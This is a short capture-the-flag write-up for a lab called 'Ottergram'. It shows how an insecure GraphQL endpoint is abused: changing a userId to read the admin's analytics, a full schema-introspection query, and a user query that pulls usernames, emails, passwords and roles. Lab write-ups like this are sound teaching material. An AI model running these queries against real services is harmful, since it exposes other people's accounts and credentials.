# Ottergram

Level: Easy\
Points: 10\
Type: Daily Challenge

After sign-up / login flow. There is a POST request to /graphql which fetch the analytics.

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Viewing it in proper format

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

We can edit the userId field and get analytics of another user.\
admin's userid is 2

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Dumping the ENTIRE Schema

```
query {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
```

explaination

```
query
└── __schema              ← the entire schema of the API
    └── types             ← list of ALL types defined
        ├── name          ← name of the type (e.g. "User", "Analytics")
        └── fields        ← list of fields on that type
            ├── name      ← field name (e.g. "username", "password")
            └── type      ← what data type this field returns
                ├── name  ← type name (e.g. "String", "Int")
                └── kind  ← category (SCALAR, OBJECT, NON_NULL, LIST)
```

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### Key Findings

There are **2 queries** and the `User` type has juicy fields:

| Query               | Returns                                   |
| ------------------- | ----------------------------------------- |
| `analytics(userId)` | Analytics                                 |
| `user(???)`         | **User** with `email`, `password`, `role` |

Lets get the username and password data.

```
query {
  user(id: 1) {
    id
    username
    email
    password
    role
  }
}
```

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
